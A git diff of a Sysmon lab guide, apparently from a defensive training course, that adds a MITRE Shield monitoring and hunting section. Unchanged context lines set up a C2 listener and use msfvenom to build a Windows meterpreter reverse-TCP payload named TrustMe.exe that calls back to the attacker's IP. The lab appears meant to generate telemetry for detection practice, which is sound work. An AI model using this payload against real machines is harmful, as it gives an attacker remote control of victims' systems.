@@ -1,7 +1,17 @@
 
 # Sysmon
 
-First, let’s start up the ADHD Linux system and set up our malware and C2 listener: 
+MITRE Shield
+------------
+
+Applicable MITRE Shield techniques:
+* [DTE0034](https://shield.mitre.org/techniques/DTE0034) - System Activity Monitoring
+* [DTE0021](https://shield.mitre.org/techniques/DTE0021) - Hunting
+
+Instructions
+------------
+
+First, let’s start up the ADHD Linux system and set up our malware and C2 listener:
 
 Let's get started by opening a Terminal as Administrator
 
@@ -19,20 +29,20 @@ $`ifconfig`
 
 ![](attachments\Clipboard_2020-06-12-12-35-15.png)
 
-Please note the IP address of your Ethernet adapter.  
+Please note the IP address of your Ethernet adapter.
 
-Please note that my adaptor is called eth0 and my IP address is 172.26.19.133.   
+Please note that my adaptor is called eth0 and my IP address is 172.26.19.133.
 
 Your IP Address and adapter name may be different.
 
 
-Now, run the following commands to start a simple backdoor and backdoor listener: 
- 
+Now, run the following commands to start a simple backdoor and backdoor listener:
+
 
 $ `sudo su -`
 Please note, the adhd password is adhd.
 
-\#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
+\#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444
 -f exe -o /tmp/TrustMe.exe`
 
 \#`cd /tmp`
